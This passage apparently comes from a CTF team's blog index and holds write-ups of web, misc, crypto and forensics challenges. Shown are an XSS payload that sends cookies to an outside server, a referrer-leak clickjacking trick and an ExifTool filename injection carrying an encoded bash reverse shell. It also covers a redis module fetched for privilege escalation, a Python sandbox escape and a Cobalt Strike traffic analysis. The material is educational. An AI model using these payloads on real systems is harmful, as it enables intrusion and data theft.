\u0026ldquo;flag\u0026rdquo; and the actual flag as contents to the database on startup:\n// backend/server.js (async () =\u0026gt; { // open the database db = await open({ filename: \u0026#39;:memory:\u0026#39;, driver: sqlite3.Database }) })().then(async () =\u0026gt; { await db.exec(\u0026#39;CREATE TABLE users (username VARCHAR(50), password VARCHAR(50), PRIMARY KEY (username))\u0026#39;) await db.exec(\u0026#39;CREATE TABLE documents (id VARCHAR(40), owner VARCHAR(50), title TEXT, data TEXT, PRIMARY KEY(id) )\u0026#39;) await db.run(\u0026#39;INSERT INTO users (username, password) VALUES (\u0026#34;admin\u0026#34;, ?)\u0026#39;, [process.env.ADMIN_PASSWORD]) await db.run(\u0026#39;INSERT INTO documents (id, owner, title, data) VALUES (?, \u0026#34;admin\u0026#34;, \u0026#34;flag\u0026#34;, ?)\u0026#39;, [uuidv4(), process.env.FLAG]) }) We also see the endpoints on the server:\n/api/login /api/signup /api/logout /api/document/:id /api/report/:id /api/document \u0026hellip; and none of them have auhorization!\nLet\u0026rsquo;s sum up. Alright, so we know that\nthe flag is in a document that the admin owns the editor renders HTML the admin looks at the URLs we report authorization is missing which means that if we get hold of the ID of the document containing the flag, we can check it without problems. In other words, we need to create a document so that when the admin opens it, it reads the admin\u0026rsquo;s document with the flag, and sends its contents or the document ID to us.\nSince only one document was inserted to the database with the owner admin, it is safe to assume that we can fetch the document containing the flag by calling the /document/last route in the frontend. This is the same as clicking \u0026ldquo;Last\u0026rdquo;. That means that we do not need to know the ID of the document or traverse the list of documents on the \u0026ldquo;My docs\u0026rdquo;-page.\nNow, we tried a lot of things and we didn\u0026rsquo;t really solve the challenge while the CTF was running. We will write about some failed attempts before giving you the solution which we got to after learning how to solve it.\nFirstly, we tried to steal the admin\u0026rsquo;s session cookie. When logging in, we see that we get a session cookie and wanted to try to steal the admin\u0026rsquo;s session cookie. We setup a server to receive requests. Then, we use the HTML img tag to load a page with the session cookie as part of the URL. Now, if the cookie header is not configured with the \u0026ldquo;http-only\u0026rdquo;-flag, JavaScript is allowed to read it. This means our server will receive a request with the session in it! I don\u0026rsquo;t see this explicitly in the code, so maybe it works. Let\u0026rsquo;s add the following HTML image tag to the Markdown editor. Note that we end the paragraph HTML tag before inserting the image tag. We don\u0026rsquo;t know why, but otherwise the image isn\u0026rsquo;t rendered.\n\u0026lt;/p\u0026gt;\u0026lt;img src=\u0026#34;https://my.server.it/?c=\u0026#34;+document.cookie \u0026gt; Hmm, it didn\u0026rsquo;t work. The server received the request, but without the cookie at the end, so it looked like https://my.server.it/?c=. Why didn\u0026rsquo;t it work? Was the third-party dependency cookie-parser setting the \u0026ldquo;http-only\u0026rdquo; cookie flag as a default configuration?\nWe thought it would be good to take step back and check whether it works with simple JavaScript injection. We tried a couple of different ways. \u0026lt;script\u0026gt;-tags were escaped, so that didn\u0026rsquo;t work. Running JavaScript through loading an image (\u0026lt;img src=\u0026quot;lol\u0026quot; onerror=alert(1)\u0026gt;) got a CSP error like image below. We could not find any CSP configurations in the backend, nor any CSP headers in the response. However, we could find the meta HTML tag \u0026lt;meta http-equiv=\u0026quot;Content-Security-Policy\u0026quot; content=\u0026quot;script-src 'self'\u0026quot;\u0026gt; in the \u0026lt;head\u0026gt; section of frontend/public/index.html.\nOK, so JavaScript injection does not seem to work. This also might explain why fetchingg the session did not work. Maybe \u0026ldquo;http-only\u0026rdquo; haven\u0026rsquo;t been configured, but CSP prevents JavaScript from stealing the cookie. Having both would be good defense in depth!\nWe also tried changing the HTML base tag. A team member noticed that the HTML base tag could be changed in the editor. If we change the tag\u0026rsquo;s href attribute to our server, we can host the scripts on the endpoints that are called. This should, from what we remember bypass CSP.\nFirst, our goal was to\nset base tag to our server (ngrok) run an iframe of the Last page and then fetch the content We used ngrok to setup a server that can receive and respond to requests. We inserted the following payload that loads the last page, changes the base href and calls our server to run JavaScript. And then we reported it. Unfortunately, (or fortunately?) that did not work. The Same-Origin Policy prevents us from extracting data from the iframe.\n\u0026lt;iframe src=\u0026#34;/document/last\u0026#34; /\u0026gt; \u0026lt;base href=//qwer-41-414-141-41.eu.ngrok.io\u0026gt; \u0026lt;img src=\u0026#34;/api/document\u0026#34; /\u0026gt; Next, we tried to run JavaScript from our ngrok-server that fetches the last page and returns it\u0026rsquo;s content. That also didn\u0026rsquo;t work.\n\u0026lt;base href=//qwer-41-414-141-41.eu.ngrok.io\u0026gt; \u0026lt;img src=\u0026#34;/api/document\u0026#34; /\u0026gt; Whatever we tried the CSP header we previously mentioned in the HTML head tag seemed to be properly configured and a CSP violation was triggered.\nSo\u0026hellip; What on earth can the solution be?\nThe solution is to use CSS! (Whaaaat?) First, we move the \u0026ldquo;Last\u0026rdquo;-button underneath the \u0026ldquo;Logout\u0026rdquo;-button. In addition, we set the meta HTML tag to allow unsafe URLs and another meta HTML tag to refresh after 3 seconds and go to the given URL. This gives time for the admin to press \u0026ldquo;Logout\u0026rdquo;, which now means pressing \u0026ldquo;Last\u0026rdquo;. When the last document now has loaded, the countdown for the refresh finishes and it redirects the page to our URL with the last document URL as the referrer header.\nLet\u0026rsquo;s see how we can do this\u0026hellip; Here is the plan:\n\u0026lt;meta name=\u0026#34;referrer\u0026#34; content=\u0026#34;unsafe-url\u0026#34;\u0026gt; \u0026lt;meta http-equiv=\u0026#34;refresh\u0026#34; content=\u0026#34;3;url=https://qwer-41-414-141-41.eu.ngrok.io\u0026#34; /\u0026gt; \u0026lt;style\u0026gt; 1. Put the \u0026#34;Last\u0026#34;-button under \u0026#34;Logout\u0026#34; with CSS 2. Make the z-index of the \u0026#34;Last\u0026#34;-button high and for the \u0026#34;Logout\u0026#34;-button low \u0026lt;/style\u0026gt; Test in the browser without getting redirected:\n\u0026lt;meta name=\u0026#34;referrer\u0026#34; content=\u0026#34;unsafe-url\u0026#34;\u0026gt; \u0026lt;style\u0026gt; div ul li:nth-child(3) a { some css } #logout { some css } \u0026lt;/style\u0026gt; When the CSS is done, add the refresh meta tag and report the document. Then you can check ngrok, requestbin or similar for the referer-header which contains the document ID for the flag.\n\u0026lt;meta name=\u0026#34;referrer\u0026#34; content=\u0026#34;unsafe-url\u0026#34;\u0026gt; \u0026lt;meta http-equiv=\u0026#34;refresh\u0026#34; content=\u0026#34;3;url=https://qwer-41-414-141-41.eu.ngrok.io\u0026#34; /\u0026gt; \u0026lt;style\u0026gt; div ul li:nth-child(3) a { position: absolute; right: 5px; z-index: 1337; width: 70px; } #logout { z-index: 1; } \u0026lt;/style\u0026gt; Now go to /document/\u0026lt;id from referrer header\u0026gt; and get your flag.\nmisc Placey I was really sad when r/place ended so I built my own. Mirror 1 Mirror 2 Mirror 3 Mirror 4\nNote: flag is in /root/flag.txt\nAuthor: @0000matteo0000\nWe get access to a website that implements the Reddit April fools feature, where you can log in and place pixels on the board. The website is very unstable and slow, and the feature does not really work, but it quickly shows that it is not actually required either.\nThe website also features a user system, where you can upload profile pictures. Uploading random (non-image) files gives the following error message in return:\nOnly image file types are accepted (JPEG, PNG, GIF). Powered by ExifTool 12.37\nSearching for this particular version of ExifTool, shows that it is vulnerable to CVE-2022-23935, where a file name that ends with \u0026ldquo;|\u0026rdquo; (pipe symbol) leads to command execution.\nGlancing over the really annoying CSRF token system, and the fact that the website was not always responding, this it the meat of the exploit when using cURL\n-F \u0026quot;avatar=@gg.jpg;filename=x|echo YmFzaCAtaSA+JiAvZGV2L3RjcC8zLjE0MC4yMjMuNy8xMDUzNCAwPiYxIA== |base64 -d | bash |\u0026quot;\nSince certain symbols break the command, encoding it let us use slash symbols and such. The above payload is a reverse shell.\nOnce dropped on the server, we discover that the flag is not readable by us.\nappuser@placey4:/root$ ls -la ls -la total 16 drwx---r-x 1 root root 19 May 12 19:45 . drwxr-xr-x 1 root root 52 May 13 18:05 .. -rw-r--r-- 1 root root 571 Apr 10 2021 .bashrc -rw-r--r-- 1 root root 161 Jul 9 2019 .profile -rwxrwxr-x 1 root root 275 May 12 19:34 entrypoint.sh -rw-r----- 1 root redisgroup 45 May 12 19:45 flag.txt drwxr-xr-x 1 root root 21 May 12 19:45 quart drwxr-xr-x 1 root root 6 May 12 19:44 redis It is only readable by users in the redisgroup group, and appuser is not part of it. The usual privesc options like sudo require password to run, so we can\u0026rsquo;t use that either. However, the redis server is running as the redis user, so if we can trick the redis server into reading the file for us, it should work out.\nGetting redis to actually do that, however, was not very easy. Especially for a warmup challenge. We ended up compiling a custom module for redis that allowed command execution, then using the limited python installation to download it\npython3 -c \u0026#34;import urllib.request; s = urllib.request.urlopen(\u0026#39;https://vps.here/module.so\u0026#39;).read(); fd=open(\u0026#39;/tmp/module.so\u0026#39;,\u0026#39;wb\u0026#39;);fd.write(s);fd.close()\u0026#34; appuser@placey4:/tmp/$ chmod +x module.so chmod +x a.so appuser@placey4:/tmp/$ redis-cli redis-cli MODULE LOAD /tmp/module.so OK system.exec \u0026#34;id\u0026#34; uid=101(redisuser) gid=101(redisgroup) groups=101(redisgroup) system.exec \u0026#34;cat /root/flag.txt\u0026#34; ptm{th3r3_w1ll_n3v3r_b3_@_pl@c3y_l1k3_h0m3y} crypto MOO One of the cows in our farm started to say weird numbers instead of MOOing, can you guess what it\u0026rsquo;s saying?\nnc challs.m0lecon.it 1753 Author: @brooklyn\nThe code we are given has two parts. The first is normal RSA encryption, using some special prime generation functions, and the flag is encrypted using this cryptosystem. We are given (N, c, e), i.e. all the public parameters. The second part has some mystery functions f1 and f2. The server lets us call these functions with our own inputs, but only 10 times.\nDoing some code searches online, quickly reveals that these functions represent how to calculate multiplicative order. This is not something you can do over a semiprime without having intimate knowledge about the factorization, so it gives us enough information so that we can factor N if we give smart inputs.\nI based my solution on this post where it says that differences in which primes divide the order of each factor can lead to a non-trivial factor. We quickly cooked up a proof-of-concept for this, and while it doesn\u0026rsquo;t work on every try, it works after a few attempts.\nfrom pwn import * from math import gcd from Crypto.Util.number import long_to_bytes a=124846525121166472890127769845656706959834701767553316679575342375728606681436245953703527478773456698735316531921607496638484885416740029028542605893861455745313937474271661656548230159065196413238268640890 factors = [2, 3, 5, 7, 11, 13, 17, 19, 23, 29, 31, 37, 41, 43, 47, 53, 59, 61, 67, 71, 73, 79, 83, 89, 97, 101, 103, 107, 109, 113, 127, 131, 137, 139, 149, 151, 157, 163, 167, 173, 179, 181, 191, 193, 197, 199, 211, 223, 227, 229, 233, 239, 241, 251, 257, 263, 269, 271, 277, 281, 283, 293, 307, 311, 313, 317, 331, 337, 347, 349, 353, 359, 367, 373, 379, 383, 389, 397, 401, 409, 419, 421, 431, 433, 439, 443, 449, 457, 461, 463, 467, 479, 487, 491, 499, 503, 509, 521, 523, 541, 547, 557, 563, 569, 571, 577, 587, 593, 599, 601, 607, 613, 617, 619, 631, 641, 643, 647, 653, 659, 661, 673, 677, 683, 691, 701, 709, 719, 727, 733, 739, 743, 751, 757, 761, 769, 773, 787, 797, 809, 811, 821, 823, 827, 829, 839, 853, 857, 859, 863, 877, 881, 883, 887, 907, 911, 919, 929, 937, 941, 947, 953, 967, 971, 977, 983, 991, 997] r = remote(\u0026#34;challs.m0lecon.it\u0026#34;, 1753) _ = r.recvline() n = int(r.recvlineS().strip().split(\u0026#34; = \u0026#34;)[1]) c = int(r.recvlineS().strip().split(\u0026#34; = \u0026#34;)[1]) e = int(r.recvlineS().strip().split(\u0026#34; = \u0026#34;)[1]) r.sendlineafter(b\u0026#34;Choose a value: \u0026#34;, str(a).encode()) M = int(r.recvlineS().strip().split(\u0026#34; = \u0026#34;)[1]) p = max(gcd(n,(pow(a, M//f, n)-1)%n) for f in factors) print(p) q = n // p assert p * q == n and p\u0026gt;1 and q\u0026gt;1 d = pow(e, -1, (p-1)*(q-1)) print(long_to_bytes(pow(c, d, n))) ","permalink":"https://bootplug.io/posts/ctf/m0leconctf_2022/","summary":"The CTF was m0leCon CTF 2022 Teaser. It was a qualifier for onsite finals in Torino. Our team got fifth place and qualified! Yay!\npwn dirtyRAT Author: @Gaaat\nDescription: I bought this backdoor from some hacking/carding group on Telegram but I\u0026rsquo;m starting to suspect that I have been scammed\u0026hellip; Can anyone help me access the only file I really need?\nnc dirtyrat.challs.m0lecon.it 10010\nWe were given a binary and the source code.","title":"m0leCon CTF 2022 Teaser"},{"content":"Misc 🔥 Kalk 🔥 Author: null\nDescription: I heard you needed a new calculator for your math course? Why buy a new one when you can just use my Calculator-as-a-Service instead!\nnc io.ept.gg 30046\nWe get a Python script to download:\n#!/usr/bin/env python3 import dis import os class Math(dict): def __init__(self): self.e = 0 self.pi = 0 def kalk(src, locals): if \u0026#39;=\u0026#39; in src: co = compile(src, \u0026#34;kalk\u0026#34;, \u0026#34;single\u0026#34;) for opc in dis.get_instructions(co): if opc.opname not in [\u0026#39;LOAD_NAME\u0026#39;, \u0026#39;LOAD_CONST\u0026#39;, \u0026#39;STORE_NAME\u0026#39;, \u0026#39;STORE_ATTR\u0026#39;, \u0026#39;RETURN_VALUE\u0026#39;]: print(\u0026#34;Bonk! \u0026gt;.\u0026lt;\u0026#34;, opc.opname) return eval(co, {}, locals) else: co = compile(src, \u0026#34;kalk\u0026#34;, \u0026#34;eval\u0026#34;) for opc in dis.get_instructions(co): if \u0026#39;CALL\u0026#39; in opc.opname: print(\u0026#39;No U! \u0026gt;.\u0026lt;\u0026#39;) return _ = eval(co, {}, locals | {\u0026#39;math\u0026#39;: Math(), \u0026#39;tease\u0026#39;: os.system}) locals[\u0026#39;_\u0026#39;] = _ return _ locals = {} while True: r = kalk(input(\u0026#39;\u0026gt; \u0026#39;), locals) if r is not None: print(repr(r)) It looks like this is a calculator as a service. When you connect to the server you can do different math operations. This is done by executing the input you send as Python code. It uses eval to do so.\nIt looks like this application block certain types of operations. It does so by compiling the input that we send in, and uses the dis module to get the instructions and opnames from the compiled code. You can for example don\u0026rsquo;t run any functions or methods, because it blocks all opname that contains CALL.\nIn the kalk function there is an if statement that checks for = in our input. If we don\u0026rsquo;t assign a value to any variable, it will jump down to the else block and run our code there. As you can see, there are two objects included in the local variables in this eval. math contains a Math-object and tease contains the os.system method.\nSince math is an object of the Math-class, we can probably try to overwrite a dunder-method (method names with double underscores which are called in specific ways). The only problem is that we cannot assign anything to the math object, since then we will be in the first if-block where this object is not available.\nUnblvR on my team found a neat way to move variables from the second eval to the first eval by using _. _ is a special variable that contains the return value of the last instruction. This variable is also available in the first eval even though we did the instruction in the second eval.\nNow we can assign math to another variable:\nnc io.ept.gg 30046 \u0026gt; math {} \u0026gt; test = _ \u0026gt; test {} The plan is to get the uninitialized Math class into a variable and then overwrite the __add__ method to be tease which is os.system. The __add__ method takes one argument (which is the value you want to add to the object). os.system() also takes one argument, so in theory we can then do a system command by adding the command we want to run to the object like this: math + 'ls -la'\nThe command ls -la should then be executed.\nYou can read more about dunder methods HERE!\nFirst we need to get the Math class:\nnc io.ept.gg 30046 \u0026gt; math.__class__ \u0026lt;class \u0026#39;__main__.Math\u0026#39;\u0026gt; \u0026gt; Math = _ \u0026gt; Math \u0026lt;class \u0026#39;__main__.Math\u0026#39;\u0026gt; Great, now we can overwrite __add__ with os.system\n\u0026gt; tease \u0026lt;built-in function system\u0026gt; \u0026gt; Math.__add__ = _ At last we can set the class of math to be our new class.\n\u0026gt; math {} \u0026gt; math = _ \u0026gt; math.__class__ = Math Now we should be able to run system commands by doing addition.\n\u0026gt; math + \u0026#34;id\u0026#34; uid=1000(kalk) gid=1000(kalk) groups=1000(kalk) 0 \u0026gt; math + \u0026#34;ls\u0026#34; flag.txt kalk.py ynetd 0 \u0026gt; math + \u0026#34;cat flag.txt\u0026#34; EPT{y0u_br0k3_my_c4lcu1at0r!}0 And we got the flag, great!\nFlag: EPT{y0u_br0k3_my_c4lcu1at0r!}\n🔥 Know your encoding 🔥 Author: zledge\nDescription: Help us decode some very important words! You might be awarded a flag in the end\nnc io.ept.gg 30045\nWe are also provided with a file:\nfrom datetime import datetime from random import Random from time import time def chunks(lst, n): \u0026#34;\u0026#34;\u0026#34;Yield successive n-sized chunks from lst.\u0026#34;\u0026#34;\u0026#34; for i in range(0, len(lst), n): yield lst[i:i + n] ALPHABET = \u0026#39;abcdefghijklmnopqrstuvwxyz+ABCDEFGHIJKLMNOPQRSTUVWXYZ/0123456789\u0026#39; def special_encoding(word, count): b = Random() b.seed(int(time() * 1000)) if count: a = \u0026#39;\u0026#39;.join(b.sample(ALPHABET,len(ALPHABET))) else: a = ALPHABET encoded = \u0026#39;\u0026#39; for x in chunks(\u0026#34;\u0026#34;.join([bin(int(byte)).lstrip(\u0026#39;0b\u0026#39;).zfill(8) for byte in word.encode(\u0026#34;ascii\u0026#34;)]), 24): y = list(chunks(x, 6)) for value in y: encoded += a[int(value.ljust(6, \u0026#34;0\u0026#34;), 2)] print(f\u0026#34;{datetime.fromtimestamp(int(time()))} - Decode the following: {encoded}\u0026#34;, flush=True) Upon connecting we\u0026rsquo;re greeted with this:\nSomeone created an encoding scheme, and now we have trouble decoding the output. Can you help us out? You have 5 seconds per word. All words are lowercase ascii before encoding. Are you ready? After answering we\u0026rsquo;re greeted with a challenge:\n2021-10-31 18:20:50 - Decode the following: BgKMAwvTChm\nSo let\u0026rsquo;s analyze the code:\nchunks is explained with a docstring, so we can move on to special_encoding immediately First it gets the current amount of seconds since 1. January 1970 also known as unix-time. ( time() ) This is then multiplied with 1000 to get millisecond precision. (time()*1000) Lastly it\u0026rsquo;s fed into a random generator as a seed. based on a variable count it then either generated a random shuffled alphabet or uses the standard one Then in the following 4 lines it base64 encodes the word (more detailed explanation inside) Firstly it generates a long bitstring and divides it up into 24 bits at a time Then it\u0026rsquo;s divided furthermore into chunks of 6 bits based on the value of these 6 bits it picks the corresponding character from the \u0026ldquo;alphabet-lookup string\u0026rdquo; a After looping over the whole bitstring the encoded result is provided prefixed with the server\u0026rsquo;s current time. Before I show the solution script there\u0026rsquo;s a few gotchas with this challenge that I\u0026rsquo;d like to mention first.\ncount variable As mentioned in the analysis special_encoding chooses which alphabet to use based on a count variable, however we don\u0026rsquo;t know the value of this variable and so we can\u0026rsquo;t be completely sure of which alphabet is used. We can make a educated guess and think that count is like a round counter starting at zero, meaning only the first round will be base64\nTimezones Timezones are always a pain to deal with, and this challenge is no exception, because if you just parse the time from the server you\u0026rsquo;ll get the wrong result. What you need to do, or what I had to do was add 3600 seconds to the time parsed.\ntime() invoked twice So a small detail that\u0026rsquo;s worth noticing is that the time() used to seed the random generator isn\u0026rsquo;t quite the same as the time presented to us. As time is invoked two times instead of being saved to a variable, this didn\u0026rsquo;t pose any problems for me. But could become a problem if the system is already stressed.\nSo without further adieu, the solve script:\nfrom datetime import datetime from pwn import remote, log from random import Random from Crypto.Util.number import long_to_bytes from string import ascii_lowercase ALPHABET = \u0026#39;abcdefghijklmnopqrstuvwxyz+ABCDEFGHIJKLMNOPQRSTUVWXYZ/0123456789\u0026#39; def decode(s, mapping): bs = \u0026#34;\u0026#34;.join([bin(mapping.index(c)).lstrip(\u0026#34;0b\u0026#34;).zfill(6) for c in s]) bs = bs[:(len(bs) // 8) * 8] return long_to_bytes(int(bs, 2)) def solve(base_time, chall): for drift in range(1000): tm = base_time * 1000 + drift b = Random() b.seed(tm) for mapping in [\u0026#39;\u0026#39;.join(b.sample(ALPHABET, len(ALPHABET))), ALPHABET]: bts = decode(chall, mapping) if all([chr(char) in ascii_lowercase for char in bts]): return bts else: log.error(\u0026#34;Couldn\u0026#39;t find solution\u0026#34;) r = remote(\u0026#34;io.ept.gg\u0026#34;, 30045) r.sendline(b\u0026#34;y\u0026#34;) r.recvline() r.recvline() for i in range(100): chal = r.recvline().decode() dt = datetime.fromisoformat(chal.split(\u0026#34; - \u0026#34;)[0]).strftime(\u0026#34;%s\u0026#34;) server_time = int(dt) + 3600 # adjust to the same timezone as the server ans = solve(server_time, chal.split(\u0026#34;: \u0026#34;)[1].strip()) print(ans) r.sendline(ans) assert r.recvline() == b\u0026#34;Correct!\\n\u0026#34; r.interactive() Further explanation brute force So since we know the time the random alphabet was generated we can just reproduce it locally. After we have the time (that\u0026rsquo;s corrected for the timezone) we have to do some brute force, because the time value we\u0026rsquo;re provided with is only in second resolution and the random seed function required millisecond resolution. Using this base value we should brute force around that base I chose a span of 0-1000ms after the base time.\ndecoding Now inside the loop we can feed these time values into the Random.seed() function. Then we can generate our random alphabet and try to decode the challenge sent by the server with both the random alphabet and the standard one. The decoding works by taking each char in the encoded string and finding it\u0026rsquo;s corresponding position in the alphabet, then we convert that value to binary, stripping the 0b and ensuring it\u0026rsquo;s 6 chars long. After that we strip the bitstring into the nearest length that\u0026rsquo;s divisible by 8. Then we parse it as a binary number and convert it from a int to bytes, and we\u0026rsquo;re done.\nsubmitting So now we have a possible correct result, but since we\u0026rsquo;re brute forcing this could be a garbage value as well. So we have to check that all the characters are printable and ASCII-lowercase, then we can be pretty certain that we\u0026rsquo;ve found the correct answer. But we won\u0026rsquo;t know for sure before the server responds with Correct!. Again if we bruteforced with a wider range for the drift we might begin to get false positives.\nFlag: EPT{kn0w-y0ur-en0ding!}\nForensics 🔥 Eastbound \u0026amp; Pwned 🔥 Author: LOLASL\nDescription: KennyP thinks that Anti-Virus is for wussies and that his enemies can\u0026rsquo;t touch him, but we are now observing hits on a signature that could indicate the presence of Cobalt Strike on his computer.\nWe have retrieved the network traffic in question and a memory dump of the machine (Windows 10 x64 Build 19043.1237), can you figure out what the attacker has been up to?\nEastboundAndPwned.zip\nWe are provided with an archive (EastboundAndPwned.zip), which contains a network capture (LA-FLAMA-BLANCA-20211025-071559.pcap) and a memory dump (LA-FLAMA-BLANCA-20211025-071559.raw).\nCobalt Strike The challenge description mentions Cobalt Strike, which is:\n[Cobalt Strike] is a commercial, full-featured, remote access tool that bills itself as \u0026ldquo;adversary simulation software designed to execute targeted attacks and emulate the post-exploitation actions of advanced threat actors\u0026rdquo;. Cobalt Strike’s interactive post-exploit capabilities cover the full range of ATT\u0026amp;CK tactics, all executed within a single, integrated system.\nSource: MITRE ATT\u0026amp;CK®\nIn short: it is a tool that is used to be able to remotely control a system. Malicious actors have used it for years to deploy “Listeners” on victim machines. To solve this challenge we need to get a better understanding of how Cobalt Strike communicates, and how it can be configured.\nC2 Communication The art and science of detecting Cobalt Strike by Nick Navis (@nickmavis) from Cisco Talos, describes the C2 communication as such:\nInfection: The client is infected with either a staged, or a stageless payload. For a stageless payload, it will decode itself, and then load itself into memory. The configuration for the beacon is XOR encrypted but by default, use a static XOR key for each respective beacon version (3 or 4). Heartbeat: The infected host sends a heartbeat to the Cobalt Strike C2 server with basic metadata and queues up any commands (read Tasks) that were added. Tasks: Cobalt Strike uses AES-256 in CBC mode with HMAC-SHA-256 to encrypt task commands (i.e. commands sent remotely by the attacker). The AES key can be found in the encrypted metadata that is sent during a heartbeat, but it also lives shortly in memory of the infected process. Callbacks: After a task is executed, the host calls back to the C2 server with a encrypted payload containing the results of the task. A more detailed explanation can be found on page 10 and 11 in the paper by Nick Navis.\nA diagram of the Cobalt Strike C2 communication flow. Source: NVISO Labs\nBeacon Configuration Didier Stevens has made a tool, 1768 K, which decodes and dumps the configuration of Cobalt Strike beacons. He later updated this tool (3 weeks ago at the time of writing this) with newer statistics.\nDecrypting Cobalt Strike Traffic Didier Stevens made yet another blog post, \u0026ldquo;Quickpost: Decrypting Cobalt Strike Traffic\u0026rdquo;. He made a tool (cs-extract-key.py) that looks in the dumped process memory for the unencrypted metadata that the beacon sends to the C2. Furthermore, he also made a tool (cs-parse-http-traffic.py) that can use the extracted keys to decrypt and parse the encrypted HTTP C2 communication in a PCAP file.\nSolution Our goal is \u0026ldquo;simple\u0026rdquo;, we need to decrypt the traffic between the infected host and the C2 server. From our research above we know that we have to:\nExtract and decrypt the Cobalt Strike Beacon configuration Dump the memory of the process that was infected with the payload Extract the AES and HMAC keys from the process memory Use these keys to decrypt the C2 (HTTP) communication Extracting And Decoding Beacon Configuration Opening the PCAP in Wireshark, we can easily filter on http and find the Cobalt Strike stager shellcode request and thus the beacon in tcp.stream eq 9. We export this payload to a file (ept_beacon).\nGET /stE1 HTTP/1.1 User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0; LBBROWSER) Host: 172.16.32.2 Connection: Keep-Alive Cache-Control: no-cache HTTP/1.1 200 OK Date: Mon, 25 Oct 2021 07:12:52 GMT Content-Type: application/octet-stream Content-Length: 261191 --- snip --- We use the updated 1768 tool to extract the configuration for the C2 beacon, note the process injection configuration.\n$ python 1768.py -r ept_beacon File: ept_beacon xorkey(chain): 0xa6b02dff length: 0x03fc0089 Config found: xorkey b\u0026#39;.\u0026#39; 0x00000000 0x000057cf 0x0001 payload type 0x0001 0x0002 0 windows-beacon_http-reverse_http 0x0002 port 0x0001 0x0002 80 0x0003 sleeptime 0x0002 0x0004 60000 0x0004 maxgetsize 0x0002 0x0004 1048576 0x0005 jitter 0x0001 0x0002 0 0x0006 maxdns 0x0001 0x0002 255 0x0007 publickey 0x0003 0x0100 30819f300d06092a864886f70d010101050003818d0030818902818100baaa6b1100ef88c737a50e0f9f86279487a3a838e7e1da5fb1fb1fbcc8b2361207756fa5cfd1fd2c86dc86e32ac73055e7c6da46d13beaa3bc171892fb62e4c90206aaa9c28cb4f9aefc752c9fbc3ae723ed070b0f1dd516b9f75cd4d58a6e61784040d4147ba9fe2c84b9df49e67311dc7999c83772fccab8b7eb78af293135020301000100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000 0x0008 server,get-uri 0x0003 0x0100 \u0026#39;172.16.32.2,/load\u0026#39; 0x0009 useragent 0x0003 0x0080 \u0026#39;Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0)\u0026#39; 0x000a post-uri 0x0003 0x0040 \u0026#39;/submit.php\u0026#39; 0x000b Malleable_C2_Instructions 0x0003 0x0100 \u0026#39;\\x00\\x00\\x00\\x04\u0026#39; 0x000c http_get_header 0x0003 0x0100 Cookie 0x000d http_post_header 0x0003 0x0100 \u0026amp;Content-Type: application/octet-stream id 0x000e SpawnTo 0x0003 0x0010 \u0026#39;\\x92~\\x14ò»D\\x08\\x89e\\x89\\x92\\x1f`ô\u0026amp;n\u0026#39; 0x001d spawnto_x86 0x0003 0x0040 \u0026#39;%windir%\\\\syswow64\\\\rundll32.exe\u0026#39; 0x001e spawnto_x64 0x0003 0x0040 \u0026#39;%windir%\\\\sysnative\\\\rundll32.exe\u0026#39; 0x000f pipename 0x0003 0x0080 (NULL ...) 0x001f CryptoScheme 0x0001 0x0002 0 0x0013 DNS_Idle 0x0002 0x0004 0 0.0.0.0 0x0014 DNS_Sleep 0x0002 0x0004 0 0x001a get-verb 0x0003 0x0010 \u0026#39;GET\u0026#39; 0x001b post-verb 0x0003 0x0010 \u0026#39;POST\u0026#39; 0x001c HttpPostChunk 0x0002 0x0004 0 0x0025 license-id 0x0002 0x0004 885300606 0x0026 bStageCleanup 0x0001 0x0002 0 0x0027 bCFGCaution 0x0001 0x0002 0 0x0036 HostHeader 0x0003 0x0080 (NULL ...) 0x0032 UsesCookies 0x0001 0x0002 1 0x0023 proxy_type 0x0001 0x0002 2 IE settings 0x003a 0x0003 0x0080 \u0026#39;\\x00\\x04\u0026#39; 0x0039 0x0003 0x0080 \u0026#39;\\x00\\x04\u0026#39; 0x0037 0x0001 0x0002 0 0x0028 killdate 0x0002 0x0004 0 0x0029 textSectionEnd 0x0002 0x0004 0 0x002b process-inject-start-rwx 0x0001 0x0002 64 PAGE_EXECUTE_READWRITE 0x002c process-inject-use-rwx 0x0001 0x0002 64 PAGE_EXECUTE_READWRITE 0x002d process-inject-min_alloc 0x0002 0x0004 0 0x002e process-inject-transform-x86 0x0003 0x0100 (NULL ...) 0x002f process-inject-transform-x64 0x0003 0x0100 (NULL ...) 0x0035 process-inject-stub 0x0003 0x0010 \u0026#39;ÒSÓn\\x83w1\\x98üEhî\\x90I?,\u0026#39; 0x0033 process-inject-execute 0x0003 0x0080 \u0026#39;\\x01\\x02\\x03\\x04\u0026#39; 0x0034 process-inject-allocation-method 0x0001 0x0002 0 0x0000 Guessing Cobalt Strike version: 4.2 (max 0x003a) With this we also find 3 HTTP requests that were during the communication (TCP stream 117, 121, and 131).\nWireshark filter: ip.addr == 172.16.32.2 and http.request.uri matches \u0026quot;/submit.php*\u0026quot;.\n\u0026amp; ls ./streams 117.hex 121.hex 131.hex $ cat 117.hex 000000403c328a67f95f9f2f4d2ed72853369bc476eff4234d932a569a3d22d852dc453e7c22d12f6bc461f2adca8c448a85c5b26204522c2fe327af7d608acc27e4333f We also find the encrypted metadata blob in a cookie sent in a /load request:\nCookie: dhJBx9uy37Z1YC4YF/ePAKIiFj9mkS7hsd0hwK3DO0vPAkwB/cziZXYPaVJiPFuJlzpLZZKM0Dbi9XwF3bHR76vyPhVKBaRN975ISSNxIjLGNvl6598X2Nop/noEA2ZIo+KWqXC6uRwIPh4EWdI4wlitNy63ye8clGZwbAZAhMY= Dump Memory Of The Infected Process We need to find the process where the beacon was injected, we know that it uses rundll32.exe to inject into a process (spawnto from the beacon configuration), we also note the process injection flag (PAGE_EXECUTE_READWRITE) .\nTo analyze the memory dump, we use the Volatility memory forensics framework. We also know from the challenge description that the provided memory dump was taken from a machine running Windows 10 x64 Build 19043.1237, the closest matching profile for this in Volatility is Win10x64_19041.\nLooking at Volatility\u0026rsquo;s Command Reference for Malware we find the malfind command, which helps find hidden or injected code/DLLs in user mode memory, based on characteristics such as VAD tag and page permissions.\n$ vol -f LA-FLAMA-BLANCA-20211025-071559.raw --profile Win10x64_19041 malfind We find 2 interesting processes: smartscreen.ex Pid: 5576 and svchost.exe Pid: 3452.\nProcess: svchost.exe Pid: 3452 Address: 0x720000 Vad Tag: VadS Protection: 